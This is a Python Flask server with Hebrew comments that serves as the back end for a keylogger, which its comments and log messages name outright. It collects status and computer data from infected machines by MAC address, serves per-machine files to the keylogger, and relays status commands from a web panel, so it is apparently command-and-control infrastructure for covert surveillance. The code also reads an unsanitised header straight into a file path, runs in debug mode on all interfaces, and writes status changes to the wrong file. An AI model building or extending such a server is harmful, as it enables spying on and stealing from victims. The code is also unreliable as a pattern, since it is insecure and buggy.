from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app)  # מאפשר בקשות מכל דומיין


def write_to_json(name_j, data):
    """פונקציה לשמירת נתונים בקובץ JSON כמערך של מכשירים"""
    try:
        file_path = f"{name_j}.json"
        mac_address = data.get("mac_address")  # נניח ש-mac_address הוא מפתח שמגיע מהקליינט או מהשרת

        # טען נתונים קיימים או אתחל מערך ריק
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                try:
                    data_json = json.load(file)
                    if not isinstance(data_json, list):  # ודא שזה מערך
                        data_json = []
                except json.JSONDecodeError:
                    data_json = []
        else:
            data_json = []

        # חפש אם המכשיר כבר קיים לפי MAC
        device_index = next((i for i, item in enumerate(data_json) if item.get("mac_address") == mac_address), -1)
        if device_index >= 0:
            # עדכן מכשיר קיים
            data_json[device_index].update(data)
        else:
            # הוסף מכשיר חדש
            data_json.append(data)

        # שמור את המערך המעודכן
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("❌ שגיאה בכתיבת קובץ JSON:", e)


@app.route('/api/status/update', methods=['POST'])
def status_update():
    print("📡 התחלת טיפול בבקשת עדכון סטטוס מהקיי לוגר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400

        write_to_json("device_status", data)  # שלח את כל ה-data כפי שהוא
        print("✅ נתוני סטטוס מהקיי לוגר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון סטטוס מהקיי לוגר:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/upload', methods=['POST'])
def upload_data():
    print("📡 התחלת טיפול בבקשת העלאת נתוני מחשב מהאתר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400

        write_to_json("device_status", data)
        print("✅ נתוני מחשב מהאתר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון נתוני מחשב מהאתר:", e)
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/files', methods=['GET'])
def get_data():
    """שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC"""
    print("📡 התחלת טיפול בבקשת שליפת נתונים עבור הקיי לוגר")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print("✅ נתונים שנשלחו אל הקיי לוגר:", data_json)  # הדפסת הנתונים שנשלחו אל הקיי לוגר
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    print("📡 התחלת טיפול בבקשת שליפת סטטוסים לכל המכשירים מהאתר")
    try:
        with open("device_status.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            if not isinstance(data_json, list):  # ודא שזה מערך
                data_json = []
            print("✅ סטטוסים שנשלחו אל הדף מהשרת:", data_json)
        return jsonify(data_json)
    except FileNotFoundError:
        return jsonify([]), 200  # החזר מערך ריק במקום שגיאה
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/check', methods=['GET'])
def check_status():
    """בדיקת סטטוס אחרון של המכשיר (לפי MAC) מהקיי לוגר"""
    print("📡 התחלת בדיקת סטטוס מהמכשיר לפי MAC (מהקיי לוגר)")
    mac_address = request.headers.get("mac-address")
    if not mac_address:
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open("change_device_status.json", "r", encoding="utf-8") as file:
            status_json = json.load(file)
            device_status = status_json.get(mac_address)

            if not device_status:
                return jsonify({"message": "No status found"}), 404

            print("✅ סטטוס אחרון מהקיי לוגר עבור MAC", mac_address, ":",
                  device_status)  # הדפסת סטטוס אחרון שהתקבל מהקיי לוגר
            return jsonify(device_status)
    except FileNotFoundError:
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/change', methods=['POST'])
def change_status():
    print("📡 התחלת טיפול בבקשת שינוי סטטוס מהאתר")
    try:
        data = request.get_json()
        if not data or "mac_address" not in data:
            return jsonify({"error": "Invalid JSON or missing mac_address"}), 400

        write_to_json("device_status", data)  # שמור את כל הנתונים שנשלחו
        print("✅ נתוני סטטוס מהאתר התקבלו:", data)
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print("❌ שגיאה בעדכון סטטוס מהאתר:", e)
        return jsonify({"error": str(e)}), 500

    
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
